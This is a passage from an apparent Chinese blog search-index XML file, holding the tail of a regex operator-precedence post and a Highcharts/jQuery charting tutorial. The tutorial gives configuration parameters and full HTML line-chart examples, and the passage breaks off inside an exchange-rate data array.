运算符优先级正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。相同优先级的从左到右进行运算，不同优先级的运算先高后低。下表从最高到最低说明了各种正则表达式运算符的优先级顺序：|运算符|描述||-|-|||转义符||(), (?:), (?=), []|圆括号和方括号||*, +, ?, {n}, {n,}, {n,m}|限定符||^, $, \任何元字符、任何字符|定位点和序列（即：位置和顺序）||竖杠|替换，”或”操作字符具有高于替换运算符的优先级，使得”m|food”匹配”m”或”food”。若要匹配”mood”或”food”，请使用括号创建子表达式，从而产生”(m|f)ood”。|]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之图形库Highcharts]]></title>
    <url>%2F2017%2F03%2F10%2Ffirst%2F</url>
    <content type="text"><![CDATA[配置需要依赖jQuery包加载jQuery包123&lt;head&gt;&lt;script src="/jquery/jquery.min.js"&gt;&lt;/script&gt;&lt;/head&gt; 加载Highcharts包123&lt;head&gt;&lt;script src="/highcharts/highcharts.js&gt;&lt;/script&gt;&lt;/head&gt; 第一步:创建HTML页面ceshi.html123456789101112131415&lt;html&gt;&lt;head&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程&lt;/title&gt; &lt;script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="/try/demo_source/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 实例中的id为container的div用于包含Highcharts绘制的图表。第二步:创建配置文件Hightcharts库使用json格式来配置1$('#container').highcharts(json); 这里json表示使用json数据格式和json格式的配置来绘制图表。步骤如下:标题为图表配置标题123var title=&#123; text:'月平均气温'&#125;; 副标题为图表配置副标题123var subtitle=&#123; text:'source:liuzhihao.com'&#125;; X轴配置要在X轴显示的项123var xAxis = &#123; categories:['一月','二月','三月','四月','五月','六月','七月','八月','九月','十月','十一月','十二月']&#125;; Y轴配置要在Y轴显示的项12345678910var yAxis = &#123; title: &#123; text:'Temperature(\xBOC)'&#125;, plotLines:[&#123; value:0, width:1, color:'#808080'&#125;]&#125;; 展示方式配置图表向右对齐123456var legend = &#123; layout:'vertical', align:'right', verticalAlign:'middle', borderWidth:0&#125; 数据配置图表要展示的数据。每个系列是个数组，每一项在图片中都会生成一条曲线。12345678910111213141516171819202122var series = [ &#123; name: 'Tokyo', data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6] &#125;, &#123; name: 'New York', data: [-0.2, 0.8, 5.7, 11.3, 17.0, 22.0, 24.8, 24.1, 20.1, 14.1, 8.6, 2.5] &#125;, &#123; name: 'Berlin', data: [-0.9, 0.6, 3.5, 8.4, 13.5, 17.0, 18.6, 17.9, 14.3, 9.0, 3.9, 1.0] &#125;, &#123; name: 'London', data: [3.9, 4.2, 5.7, 8.5, 11.9, 15.2, 17.0, 16.6, 14.2, 10.3, 6.6, 4.8] &#125;]; 第三部:创建json数据组合是由配置信息:1234567891011var json = &#123;&#125;;json.title = title;json.subtitle = subtitle;json.xAxis = xAxis;json.yAxis = yAxis;json.tooltip = tooltip;json.legend = legend;json.series = series;Step 4: Draw the chart$('#container').highcharts(json); 实例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394var json = &#123;&#125;;json.title = title;json.subtitle = subtitle;json.xAxis = xAxis;json.yAxis = yAxis;json.tooltip = tooltip;json.legend = legend;json.series = series;Step 4: Draw the chart$('#container').highcharts(json);实例以下为完整的实例(HighchartsTest.htm)：&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="http://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var title = &#123; text: '月平均气温' &#125;; var subtitle = &#123; text: 'Source: runoob.com' &#125;; var xAxis = &#123; categories: ['一月', '二月', '三月', '四月', '五月', '六月' ,'七月', '八月', '九月', '十月', '十一月', '十二月'] &#125;; var yAxis = &#123; title: &#123; text: 'Temperature (\xB0C)' &#125;, plotLines: [&#123; value: 0, width: 1, color: '#808080' &#125;] &#125;; var tooltip = &#123; valueSuffix: '\xB0C' &#125; var legend = &#123; layout: 'vertical', align: 'right', verticalAlign: 'middle', borderWidth: 0 &#125;; var series = [ &#123; name: 'Tokyo', data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6] &#125;, &#123; name: 'New York', data: [-0.2, 0.8, 5.7, 11.3, 17.0, 22.0, 24.8, 24.1, 20.1, 14.1, 8.6, 2.5] &#125;, &#123; name: 'Berlin', data: [-0.9, 0.6, 3.5, 8.4, 13.5, 17.0, 18.6, 17.9, 14.3, 9.0, 3.9, 1.0] &#125;, &#123; name: 'London', data: [3.9, 4.2, 5.7, 8.5, 11.9, 15.2, 17.0, 16.6, 14.2, 10.3, 6.6, 4.8] &#125; ]; var json = &#123;&#125;; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.legend = legend; json.series = series; $('#container').highcharts(json);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 参数配置(属性+事件)1、chart.events.addSeries：添加数列到图表中。2、chart.events.click：整个图表的绘图区上所发生的点击事件。3、chart.events.load：图表加载事件。4、chart.events.redraw：图表重画事件，当点击图注显示和隐藏绘图时可以触发。5、chart.events.selection：当图表曲线可选择放大时，当选择图表操作时，可以触发该事件。6、chart.height：所绘制图表的高度值。7、chart.inverted：图表中的x，y轴对换。8、chart.polar：是否为极性图表。9、chart.reflow：当窗口大小改变时，图表宽度自适应窗口大小改变。10、chart.renderTo：图表加载的位置，是页面上的一个DOM对象。11、chart.showAxes：在空白图表中，是否显示坐标轴。12、chart.type：图表的类型，默认为line，还有bar/column/pie……13、chart.width：图表绘图区的宽度，默认为自适应。14、chart.zoomType：图表中数据报表的放大类型，可以以X轴放大，或是以Y轴放大，还可以以XY轴同时放大。15、colors：图表中多数列时，各数列之间的颜色。是一个数组，一般不动。16、credits.enabled：是否允许显示版权信息。17、credits.href：版权所有的链接。18、credits.text：版权信息显示文字。19、exporting.buttons.exportButton.enabled：是否允许显示导出按钮。20、exporting.buttons.exportButton.menuItems：导出按钮的菜单选项。21、exporting.buttons.exportButton.onclick：导出按钮被点击的事件，不是内部的菜单。22、exporting.buttons.printButton.enabled：是否允许打印按钮。23、exporting.buttons.printButton.onclick：打印按钮的点击事件。24、exporting.enabled：打印和导出按钮是否被允许。25、exporting.filename：被导出文件的文件名。26、exporting.type：默认导出图片的文件格式。27、exporting.url：SVG图表转换并导出的接口处理地址。28、exporing.width：默认导出图片的宽度。29、labels：标签，可以加载到图表的任何位置，里面有items，style。30、lang：语言参数配置，与导出按钮菜单有关的配置，时间名称的配置等。31、legend.enabled：是否允许图注。32、navigation.buttonOptions.enabled：图表中所有导航中的按钮是否可被点击。33、plotOptions.area.allowPointSelect：是否允许数据点的点击。34、plotOptions.area.color：绘图的颜色。35、plotOptions.area.dataLabels.enabled：是否允许数据标签。36、plotOptions.area.enableMouseTracking：是否允许数据图表中，数据点的鼠标跟踪气泡显示。37、plotOptions.area.events.checkboxClick：数据图表中图注中复选框的点击事件。38、plotOptions.area.events.click：数据图表中，数据点的点击事件。39、plotOptions.area.events.hide：数据图表中，某一数据序列隐藏时的事件。40、plotOptions.area.events.show：数据图表中，某一数据序列显示时的事件。41、plotOptions.area.events.legendItemClick：数据图表中，图注中的项目被点击时的事件，直接赋值false，则不可点击。42、plotOptions.area.events.mouseOut：数据点的鼠标移出事件。43、plotOptions.area.events.mouseOver：数据点的鼠标经过事件。44、plotOptions.area.marker.enabled：图表中绘图中是否显示点的标记符。45、plotOptions.area.marker.states.hover.enabled：是否允许标记符的鼠标经过状态。46、plotOptions.area.marker.states.select.enabled：是否允许标记符的选择状态。47、plotOptions.area.point.events.click：图表中每一个单独的点点击事件。48、plotOptions.area.point.events.mouseOut49、plotOptions.area.point.events..mouseOver50、plotOptions.area.point.events.remove：删除图表中的点时的事件。51、plotOptions.area.point.events.select：图表中点选择事件。52、plotOptions.area.point.events.unselect：图表中点取消选择时的事件。53、plotOptions.area.point.events.update：图表中数据发生更新时的事件。54、plotOptions.area.visible：加载时，数据序列默认是显示还是隐藏。55、plotOptions.area.zIndex：在多序列的情况下，调整每一个序列的层叠顺序。以上的point.events同样还适用于其他面积类图表（arearange、areaspline、areasplinerange），其他的柱状图（bar、column）及所有图表。56、plotOptions.area.showInLegend：是否在图注中显示。57、plotOptions.area.stacking：是以值堆叠，还是以百分比堆叠。58、plotOptions.area.states.hover.enabled：鼠标放上的状态是否允许。59、plotOptions.area.stickyTracking：鼠标粘性跟踪数据点。60、plotOptions.arearange，plotOptions.areaspline，plotOptions.areasplinerange类同于plotOptions.area61、plotOptions.bar.groupPadding：对于柱状图分组，每个分组之间的间隔。62、plotOptions.bar.grouping：是否对数据进行分组。63、plotOptions.bar.minPointLength:：定义当point值为零时，点的最小长度为多少64、plotOptions.bar.showInLegend：是否在图注中显示。65、plotOptions.bar.stacking：是以值堆叠，还是以百分比堆叠（normal/percent）。66、plotOptions.column，plotOptions.columnrange类同于plotOptions.bar67、plotOptions.line的相关配置类似于plotOptions.area配置。68、plotOptions.pie.ignoreHiddenPoint：在饼状图中，某一个序列经图注点击隐藏后，整个饼状图是重新以100%分配，还是只在原图基础上隐藏，呈现一个缺口。69、plotOptions.pie.innerSize：绘制饼状图时，饼状图的圆心预留多大的空白。70、plotOptions.pie.slicedOffset：与allowPointSelect结合使用，当点被点击时，对应的扇区剥离，这个参数即配置离开的距离。71、plotOptions.pie的其他常用配置参数类同于plotOptions.area,plotOptions.scatter，plotOptions.series，plotOptions.spline的相关配置类似于plotOptions.area配置。72、series：是一个数组。73、series.data.color：某一个数据的颜色。74、series.data.dataLabels：序列中某一个数据的数据标签。75、series.data.events类同于plotOptions.area.point.events的相关配置。76、series.data.marker类同于plotOptions.area.marker的相关配置。77、series.data.name：配置数据点的名称。78、series.data.sliced：配置在饼图中，扇区的分离距离大小。79、series.data.x：点的x值。80、series.data.y：点的y值。81、series.name：数据序列的名称。82、series.stack：堆叠的分组索引。83、series.type：数据序列的展示类型。84、series.xAxis，series.yAxis：当使用多坐标轴时，指定某个数列对应哪个坐标轴。85、subtitle：配置图表的子标题。86、title：配置图表的标题。87、tooltip：配置图表中数据的气泡提示。88、tooltip.valueDecimals：允许的小数点位数。89、tooltip.percentageDecimals：允许百分比的小数点后位数。90、xAxis，yAxis配置设置坐标轴91、allowDecimals：坐标轴上是否允许小数。92、categories：是一个数组，坐标轴的分类。93、plotLines：绘制主线。94、tickColor：刻度颜色。95、tickInterval：刻度的步进值。96、labels.rotation：刻度标签旋转度数chart：图表区选项 参数 描述 默认值 backgroundColor 设置图表区背景色 #FFFFFF borderWidth 设置图表边框宽度 0 borderRadius 设置图表边框圆角角度 5 renderTo 图表放置的容器，一般在html中放置一个DIV，获取DIV的id属性值 null defaultSeriesType 默认图表类型line, spline, area, areaspline, column, bar, pie , scatter 0 width 图表宽度，默认根据图表容器自适应宽度 null height 图表高度，默认根据图表容器自适应高度 null margin 设置图表与其他元素之间的间距，数组，如[0,0,0,0] null plotBackgroundColor 主图表区背景色，即X轴与Y轴围成的区域的背景色 null plotBorderColor 主图表区边框的颜色，即X轴与Y轴围成的区域的边框颜色 null plotBorderWidth 主图表区边框的宽度 0 shadow 是否设置阴影，需要设置背景色backgroundColor。 false reflow 是否自使用图表区域高度和宽度，如果没有设置width和height时，会自适应大小。 true zoomType 拖动鼠标进行缩放，沿x轴或y轴进行缩放，可以设置为：’x’,’y’,’xy’ “ events 事件回调，支持addSeries方法，click方法，load方法，selection方法等的回调函数。 Color：颜色选项 参数 描述 默认值 color 用于展示图表，折线/柱状/饼状等图的颜色，数组形式。 array Highcharts已经默认提供了多种颜色方案，当要显示的图形多于颜色种类时，多出的图形会自动从第一种颜色方案开始选取。自定义颜色方案的方法：1234Highcharts.setOptions(&#123; colors: ['#058DC7', '#50B432', '#ED561B', '#DDDF00', '#24CBE5', '#64E572', '#FF9655','#FFF263', '#6AF9C4']&#125;); Title：标题选项 参数 描述 默认值 text 标题文本内容。 Chart title align 水平对齐方式。 center verticalAlign 垂直对齐方式。 top margin 标题与副标题之间或者主图表区间的间距。 15 floating 是否浮动，如果为true，则标题可以偏离主图表区，可配合x,y属性使用。 false style 设置CSS样式。 {color: ‘#3E576F’, fontSize: ‘16px’}|Subtitle：副标题选项副标题提供的属性选项与标题title大致相同，可参照上述标题选项，值得一提的是副标题的text选项默认为’’，即空的，所以默认情况下副标题不显示。xAxis:X轴选项 参数 描述 默认值 categories 设置X轴分类名称，数组，例如：categories: [‘Apples’, ‘Bananas’, ‘Oranges’] [] title X轴名称，支持text、enabled、align、rotation、style等属性 labels 设置X轴各分类名称的样式style，格式formatter，角度rotation等. array max X轴最大值(categories为空时)，如果为null，则最大值会根据X轴数据自动匹配一个最大值。 null min X轴最小值(categories为空时)，如果为null，则最小值会根据X轴数据自动匹配一个最小值。 array gridLineColor 网格（竖线）颜色 #C0C0C0 gridLineWidth 网格(竖线)宽度 1 lineColor 基线颜色 #C0D0E0 lineWidth 基线宽度 0 yAxis：Y轴选项Y轴选项与上述xAxis选项基本一致，请参照上表中的参数设置，不再单独列出。Series：数据项选项数据列选项用于设置图表中要展示的数据相关的属性 参数 描述 默认值 data 显示在图表中的数据列，可以为数组或者JSON格式的数据。如：data:[0, 5, 3, 5]，或 data: [{name: ‘Point 1’,y: 0}, {name: ‘Point 2’,y: 5}]|”||name|显示数据列的名称。|”||type|数据列类型，支持 area, areaspline, bar, column, line, pie, scatter or spline|line|plotOptions:数据点选项 参数 描述 默认值 enabled 是否在数据点上直接显示数据 false allowPointSelect 是否允许使用鼠标选中数据点 false formatter 回调函数，格式化数据显示内容 formatter: function() {return this.y;} Tooltip：数据点提示框 参数 描述 默认值 enabled 是否显示提示框 true backgroundColor 设置提示框的背景色 rgba(255, 255, 255, .85) borderColor 提示框边框颜色，默认自动匹配数据列的颜色 auto borderRadius 提示框圆角度 5 shadow 是否显示提示框阴影 true style 设置提示框内容样式，如字体颜色等 color:’#333’ formatter 回调函数，用于格式化输出提示框的显示内容。返回的内容支持html标签如：, , , , , 2 Legend：图例选项 |参数|描述|默认值||layout|显示形式，支持水平horizontal和垂直vertical|horizontal||align|对齐方式。|center||backgroundColor|图例背景色。|null||borderColor|图例边框颜色。|#909090||borderRadius|图例边框角度|5||enabled|是否显示图例|true||floating|是否可以浮动，配合x，y属性。|false||shadow|是否显示阴影|false||style| 设置图例内容样式|”| 曲线图示例以下均来自菜鸟教程示例1基本曲线图： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="http://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var title = &#123; text: '城市平均气温' &#125;; var subtitle = &#123; text: 'Source: runoob.com' &#125;; var xAxis = &#123; categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'] &#125;; var yAxis = &#123; title: &#123; text: 'Temperature (\xB0C)' &#125;, plotLines: [&#123; value: 0, width: 1, color: '#808080' &#125;] &#125;; var tooltip = &#123; valueSuffix: '\xB0C' &#125; var legend = &#123; layout: 'vertical', align: 'right', verticalAlign: 'middle', borderWidth: 0 &#125;; var series = [ &#123; name: 'Tokyo', data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6] &#125;, &#123; name: 'New York', data: [-0.2, 0.8, 5.7, 11.3, 17.0, 22.0, 24.8, 24.1, 20.1, 14.1, 8.6, 2.5] &#125;, &#123; name: 'London', data: [3.9, 4.2, 5.7, 8.5, 11.9, 15.2, 17.0, 16.6, 14.2, 10.3, 6.6, 4.8] &#125; ]; var json = &#123;&#125;; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.legend = legend; json.series = series; $('#container').highcharts(json);&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2带有数据标签的曲线图: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var title = &#123; text: '每月平均温度' &#125;; var subtitle = &#123; text: 'Source: runoob.com' &#125;; var xAxis = &#123; categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'] &#125;; var yAxis = &#123; title: &#123; text: 'Temperature (\xB0C)' &#125; &#125;; var plotOptions = &#123; line: &#123; dataLabels: &#123; enabled: true &#125; &#125; &#125;; var series= [&#123; name: 'Tokyo', data: [7.0, 6.9, 9.5, 14.5, 18.4, 21.5, 25.2, 26.5, 23.3, 18.3, 13.9, 9.6] &#125;, &#123; name: 'London', data: [3.9, 4.2, 5.7, 8.5, 11.9, 15.2, 17.0, 16.6, 14.2, 10.3, 6.6, 4.8] &#125; ]; var json = &#123;&#125;; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例3时间序列可缩放的图表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; zoomType: 'x' &#125;; var title = &#123; text: 'USD to EUR exchange rate from 2006 through 2008' &#125;; var subtitle = &#123; text: document.ontouchstart === undefined ? 'Click and drag in the plot area to zoom in' : 'Pinch the chart to zoom in' &#125;; var xAxis = &#123; type: 'datetime', minRange: 14 * 24 * 3600000 // 14 天 &#125;; var yAxis = &#123; title: &#123; text: 'Exchange rate' &#125; &#125;; var legend = &#123; enabled: false &#125;; var plotOptions = &#123; area: &#123; fillColor: &#123; linearGradient: &#123; x1: 0, y1: 0, x2: 0, y2: 1&#125;, stops: [ [0, Highcharts.getOptions().colors[0]], [1, Highcharts.Color(Highcharts.getOptions().colors[0]).setOpacity(0).get('rgba')] ] &#125;, marker: &#123; radius: 2 &#125;, lineWidth: 1, states: &#123; hover: &#123; lineWidth: 1 &#125; &#125;, threshold: null &#125; &#125;; var series= [&#123; type: 'area', name: 'USD to EUR', pointInterval: 24 * 3600 * 1000, pointStart: Date.UTC(2006, 0, 1), data: [ 0.8446, 0.8445, 0.8444, 0.8451, 0.8418, 0.8264, 0.8258, 0.8232, 0.8233, 0.8258, 0.8283, 0.8278, 0.8256, 0.8292, 0.8239, 0.8239, 0.8245, 0.8265, 0.8261, 0.8269, 0.8273, 0.8244, 0.8244, 0.8172, 0.8139, 0.8146, 0.8164, 0.82, 0.8269, 0.8269, 0.8269, 0.8258, 0.8247, 0.8286, 0.8289, 0.8316, 0.832, 0.8333, 0.8352, 0.8357, 0.8355, 0.8354, 0.8403, 0.8403, 0.8406, 0.8403, 0.8396, 0.8418, 0.8409, 0.8384, 0.8386, 0.8372, 0.839, 0.84, 0.8389, 0.84, 0.8423, 0.8423, 0.8435, 0.8422, 0.838, 0.8373, 0.8316, 0.8303, 0.8303, 0.8302, 0.8369, 0.84, 0.8385, 0.84, 0.8401, 0.8402, 0.8381, 0.8351, 0.8314, 0.8273, 0.8213, 0.8207, 0.8207, 0.8215, 0.8242, 0.8273, 0.8301, 0.8346, 0.8312, 0.8312, 0.8312, 0.8306, 0.8327, 0.8282, 0.824, 0.8255, 0.8256, 0.8273, 0.8209, 0.8151, 0.8149, 0.8213, 0.8273, 0.8273, 0.8261, 0.8252, 0.824, 0.8262, 0.8258, 0.8261, 0.826, 0.8199, 0.8153, 0.8097, 0.8101, 0.8119, 0.8107, 0.8105, 0.8084, 0.8069, 0.8047, 0.8023, 0.7965, 0.7919, 0.7921, 0.7922, 0.7934, 0.7918, 0.7915, 0.787, 0.7861, 0.7861, 0.7853, 0.7867, 0.7827, 0.7834, 0.7766, 0.7751, 0.7739, 0.7767, 0.7802, 0.7788, 0.7828, 0.7816, 0.7829, 0.783, 0.7829, 0.7781, 0.7811, 0.7831, 0.7826, 0.7855, 0.7855, 0.7845, 0.7798, 0.7777, 0.7822, 0.7785, 0.7744, 0.7743, 0.7726, 0.7766, 0.7806, 0.785, 0.7907, 0.7912, 0.7913, 0.7931, 0.7952, 0.7951, 0.7928, 0.791, 0.7913, 0.7912, 0.7941, 0.7953, 0.7921, 0.7919, 0.7968, 0.7999, 0.7999, 0.7974, 0.7942, 0.796, 0.7969, 0.7862, 0.7821, 0.7821, 0.7821, 0.7811, 0.7833, 0.7849, 0.7819, 0.7809, 0.7809, 0.7827, 0.7848, 0.785, 0.7873, 0.7894, 0.7907, 0.7909, 0.7947, 0.7987, 0.799, 0.7927, 0.79, 0.7878, 0.7878, 0.7907, 0.7922, 0.7937, 0.786, 0.787, 0.7838, 0.7838, 0.7837, 0.7836, 0.7806, 0.7825, 0.7798, 0.777, 0.777, 0.7772, 0.7793, 0.7788, 0.7785, 0.7832, 0.7865, 0.7865, 0.7853, 0.7847, 0.7809, 0.778, 0.7799, 0.78, 0.7801, 0.7765, 0.7785, 0.7811, 0.782, 0.7835, 0.7845, 0.7844, 0.782, 0.7811, 0.7795, 0.7794, 0.7806, 0.7794, 0.7794, 0.7778, 0.7793, 0.7808, 0.7824, 0.787, 0.7894, 0.7893, 0.7882, 0.7871, 0.7882, 0.7871, 0.7878, 0.79, 0.7901, 0.7898, 0.7879, 0.7886, 0.7858, 0.7814, 0.7825, 0.7826, 0.7826, 0.786, 0.7878, 0.7868, 0.7883, 0.7893, 0.7892, 0.7876, 0.785, 0.787, 0.7873, 0.7901, 0.7936, 0.7939, 0.7938, 0.7956, 0.7975, 0.7978, 0.7972, 0.7995, 0.7995, 0.7994, 0.7976, 0.7977, 0.796, 0.7922, 0.7928, 0.7929, 0.7948, 0.797, 0.7953, 0.7907, 0.7872, 0.7852, 0.7852, 0.786, 0.7862, 0.7836, 0.7837, 0.784, 0.7867, 0.7867, 0.7869, 0.7837, 0.7827, 0.7825, 0.7779, 0.7791, 0.779, 0.7787, 0.78, 0.7807, 0.7803, 0.7817, 0.7799, 0.7799, 0.7795, 0.7801, 0.7765, 0.7725, 0.7683, 0.7641, 0.7639, 0.7616, 0.7608, 0.759, 0.7582, 0.7539, 0.75, 0.75, 0.7507, 0.7505, 0.7516, 0.7522, 0.7531, 0.7577, 0.7577, 0.7582, 0.755, 0.7542, 0.7576, 0.7616, 0.7648, 0.7648, 0.7641, 0.7614, 0.757, 0.7587, 0.7588, 0.762, 0.762, 0.7617, 0.7618, 0.7615, 0.7612, 0.7596, 0.758, 0.758, 0.758, 0.7547, 0.7549, 0.7613, 0.7655, 0.7693, 0.7694, 0.7688, 0.7678, 0.7708, 0.7727, 0.7749, 0.7741, 0.7741, 0.7732, 0.7727, 0.7737, 0.7724, 0.7712, 0.772, 0.7721, 0.7717, 0.7704, 0.769, 0.7711, 0.774, 0.7745, 0.7745, 0.774, 0.7716, 0.7713, 0.7678, 0.7688, 0.7718, 0.7718, 0.7728, 0.7729, 0.7698, 0.7685, 0.7681, 0.769, 0.769, 0.7698, 0.7699, 0.7651, 0.7613, 0.7616, 0.7614, 0.7614, 0.7607, 0.7602, 0.7611, 0.7622, 0.7615, 0.7598, 0.7598, 0.7592, 0.7573, 0.7566, 0.7567, 0.7591, 0.7582, 0.7585, 0.7613, 0.7631, 0.7615, 0.76, 0.7613, 0.7627, 0.7627, 0.7608, 0.7583, 0.7575, 0.7562, 0.752, 0.7512, 0.7512, 0.7517, 0.752, 0.7511, 0.748, 0.7509, 0.7531, 0.7531, 0.7527, 0.7498, 0.7493, 0.7504, 0.75, 0.7491, 0.7491, 0.7485, 0.7484, 0.7492, 0.7471, 0.7459, 0.7477, 0.7477, 0.7483, 0.7458, 0.7448, 0.743, 0.7399, 0.7395, 0.7395, 0.7378, 0.7382, 0.7362, 0.7355, 0.7348, 0.7361, 0.7361, 0.7365, 0.7362, 0.7331, 0.7339, 0.7344, 0.7327, 0.7327, 0.7336, 0.7333, 0.7359, 0.7359, 0.7372, 0.736, 0.736, 0.735, 0.7365, 0.7384, 0.7395, 0.7413, 0.7397, 0.7396, 0.7385, 0.7378, 0.7366, 0.74, 0.7411, 0.7406, 0.7405, 0.7414, 0.7431, 0.7431, 0.7438, 0.7443, 0.7443, 0.7443, 0.7434, 0.7429, 0.7442, 0.744, 0.7439, 0.7437, 0.7437, 0.7429, 0.7403, 0.7399, 0.7418, 0.7468, 0.748, 0.748, 0.749, 0.7494, 0.7522, 0.7515, 0.7502, 0.7472, 0.7472, 0.7462, 0.7455, 0.7449, 0.7467, 0.7458, 0.7427, 0.7427, 0.743, 0.7429, 0.744, 0.743, 0.7422, 0.7388, 0.7388, 0.7369, 0.7345, 0.7345, 0.7345, 0.7352, 0.7341, 0.7341, 0.734, 0.7324, 0.7272, 0.7264, 0.7255, 0.7258, 0.7258, 0.7256, 0.7257, 0.7247, 0.7243, 0.7244, 0.7235, 0.7235, 0.7235, 0.7235, 0.7262, 0.7288, 0.7301, 0.7337, 0.7337, 0.7324, 0.7297, 0.7317, 0.7315, 0.7288, 0.7263, 0.7263, 0.7242, 0.7253, 0.7264, 0.727, 0.7312, 0.7305, 0.7305, 0.7318, 0.7358, 0.7409, 0.7454, 0.7437, 0.7424, 0.7424, 0.7415, 0.7419, 0.7414, 0.7377, 0.7355, 0.7315, 0.7315, 0.732, 0.7332, 0.7346, 0.7328, 0.7323, 0.734, 0.734, 0.7336, 0.7351, 0.7346, 0.7321, 0.7294, 0.7266, 0.7266, 0.7254, 0.7242, 0.7213, 0.7197, 0.7209, 0.721, 0.721, 0.721, 0.7209, 0.7159, 0.7133, 0.7105, 0.7099, 0.7099, 0.7093, 0.7093, 0.7076, 0.707, 0.7049, 0.7012, 0.7011, 0.7019, 0.7046, 0.7063, 0.7089, 0.7077, 0.7077, 0.7077, 0.7091, 0.7118, 0.7079, 0.7053, 0.705, 0.7055, 0.7055, 0.7045, 0.7051, 0.7051, 0.7017, 0.7, 0.6995, 0.6994, 0.7014, 0.7036, 0.7021, 0.7002, 0.6967, 0.695, 0.695, 0.6939, 0.694, 0.6922, 0.6919, 0.6914, 0.6894, 0.6891, 0.6904, 0.689, 0.6834, 0.6823, 0.6807, 0.6815, 0.6815, 0.6847, 0.6859, 0.6822, 0.6827, 0.6837, 0.6823, 0.6822, 0.6822, 0.6792, 0.6746, 0.6735, 0.6731, 0.6742, 0.6744, 0.6739, 0.6731, 0.6761, 0.6761, 0.6785, 0.6818, 0.6836, 0.6823, 0.6805, 0.6793, 0.6849, 0.6833, 0.6825, 0.6825, 0.6816, 0.6799, 0.6813, 0.6809, 0.6868, 0.6933, 0.6933, 0.6945, 0.6944, 0.6946, 0.6964, 0.6965, 0.6956, 0.6956, 0.695, 0.6948, 0.6928, 0.6887, 0.6824, 0.6794, 0.6794, 0.6803, 0.6855, 0.6824, 0.6791, 0.6783, 0.6785, 0.6785, 0.6797, 0.68, 0.6803, 0.6805, 0.676, 0.677, 0.677, 0.6736, 0.6726, 0.6764, 0.6821, 0.6831, 0.6842, 0.6842, 0.6887, 0.6903, 0.6848, 0.6824, 0.6788, 0.6814, 0.6814, 0.6797, 0.6769, 0.6765, 0.6733, 0.6729, 0.6758, 0.6758, 0.675, 